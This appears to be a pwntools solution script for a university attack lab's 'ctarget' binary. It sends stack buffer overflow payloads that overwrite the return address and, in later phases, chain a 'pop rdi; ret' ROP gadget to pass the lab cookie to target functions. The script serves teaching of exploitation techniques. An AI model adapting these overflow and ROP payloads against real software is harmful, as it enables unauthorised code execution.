#########################PART 1############################
from pwn import *
context.log_level="debug"
import sys
reload(sys)
sys.setdefaultencoding('utf8')
#########################PART 2############################
argt="-q"
p=process(argv=['./ctarget', argt])
#gdb.attach(p,"b*0x40186A")

touch1=0x4017C0
touch2=0x4017EC
touch3=0x4018FA

p.recvuntil("Cookie:")
cookie=int(p.recv(11),16)
print(hex(cookie))

#########################touch1 task############################
'''
payload1="a"*40+p64(touch1)
p.sendline(payload1)
'''
#########################touch2 task############################
'''
pop_rdi_ret=0x000000000040141b
payload2="a"*40+p64(pop_rdi_ret)+p64(cookie)+p64(touch2)
p.sendline(payload2)
'''
#########################touch3 task############################
random=0x5561dc23
pop_rdi_ret=0x000000000040141b
payload3="a"*40+p64(pop_rdi_ret)+p64(random)+p64(touch3)
p.sendline(payload3)


p.interactive()
